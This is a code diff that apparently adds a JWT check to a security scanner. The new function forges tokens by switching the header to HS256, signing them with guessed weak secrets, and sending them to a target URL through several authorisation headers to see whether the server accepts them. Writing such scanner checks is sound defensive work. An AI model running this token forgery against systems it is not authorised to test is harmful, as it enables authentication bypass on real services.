@@ -167,3 +167,55 @@ def test_jwt_alg_none(
                 "confidence": 0.7,
             }
     return None
+
+
+def test_jwt_rs256_hs256(
+    jwt_token: str,
+    target_url: str,
+    request_func,
+    auth_headers: list[str] | None = None,
+) -> dict | None:
+    """Test JWT for RS256→HS256 algorithm confusion vulnerability."""
+    parts = jwt_token.split(".")
+    if len(parts) != 3:
+        return None
+
+    if auth_headers is None:
+        auth_headers = ["Authorization", "X-Access-Token", "Token"]
+
+    weak_secrets = ["", "secret", "public"]
+
+    for secret in weak_secrets:
+        try:
+            header_b64 = base64.urlsafe_b64encode(
+                json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
+            ).decode().rstrip("=")
+            message = f"{header_b64}.{parts[1]}"
+            import hmac, hashlib
+            sig = base64.urlsafe_b64encode(
+                hmac.new(
+                    secret.encode() if secret else b"",
+                    message.encode(),
+                    hashlib.sha256,
+                ).digest()
+            ).decode().rstrip("=")
+            forged = f"{message}.{sig}"
+
+            for auth_header in auth_headers:
+                resp = request_func(target_url, {auth_header: f"Bearer {forged}"})
+                if resp is not None and resp.status_code == 200:
+                    return {
+                        "type": "JWT_ALGORITHM_CONFUSION",
+                        "severity": "HIGH",
+                        "endpoint": target_url,
+                        "evidence": {
+                            "original_jwt": jwt_token[:20] + "...",
+                            "test_algorithm": "HS256",
+                            "auth_header": auth_header,
+                            "message": "Server accepted JWT with alg:HS256 (RS256→HS256 confusion)",
+                        },
+                        "confidence": 0.7,
+                    }
+        except Exception:
+            continue
+    return None
